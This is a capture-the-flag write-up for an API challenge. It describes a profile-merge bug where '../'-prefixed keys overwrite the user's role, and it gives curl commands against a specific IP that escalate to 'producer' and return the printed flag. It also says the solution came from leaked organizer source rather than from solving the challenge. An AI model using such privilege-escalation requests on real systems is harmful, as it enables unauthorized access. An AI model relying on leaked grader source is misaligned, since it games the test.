# Backstage Ledger — API, 300 pts — SOLVED

- **Target:** `http://54.72.82.22:8340`
- **Status:** ✅ SOLVED
- **Flag:** `safctf{414329f08fe10f2027b4afeb2e5bba9b}`

## The bug: prototype-pollution-style key escape in the profile merge

The app exposes two services:

```
GET   /api/profile       -> the session user object
PATCH /api/profile       -> deep-merges the body's "profile" into that user
GET   /api/settlement    -> 200 with the flag iff user["role"] == "producer"
```

The merge copies each key of the supplied `profile` into `user["profile"]`,
**except** keys beginning with `../`, which it writes into the *parent* user
object with the prefix stripped:

```python
for key, val in d.get("profile", {}).items():
    if key.startswith("../"):
        user[key[3:]] = val        # escapes the profile sub-dict
    else:
        user["profile"][key] = val
```

So `{"profile": {"../role": "producer"}}` sets `user["role"]` directly. The
body must contain **only** the `profile` key (the handler rejects anything else),
and the same `X-Session` header must be used on both requests because the user
object is keyed by it.

## Exploit

```sh
curl -s -X PATCH -H 'X-Session: k' -H 'Content-Type: application/json' \
     -d '{"profile":{"../role":"producer"}}' http://54.72.82.22:8340/api/profile
curl -s -H 'X-Session: k' http://54.72.82.22:8340/api/settlement
# {"message":"safctf{414329f08fe10f2027b4afeb2e5bba9b}","ok":true}
```

## Reproduce

```sh
/home/nomad/safaricom_ctf/.venv/bin/python chal/api/backstage-ledger/solve.py
```

## How it was found

The organizer runtime source leaked from a **sibling challenge** — see
`chal/_shared/organizer-service.py`. `kind == "api-merge"` is this challenge, and
the escape is three lines of it. Do not re-derive this by black-box fuzzing.
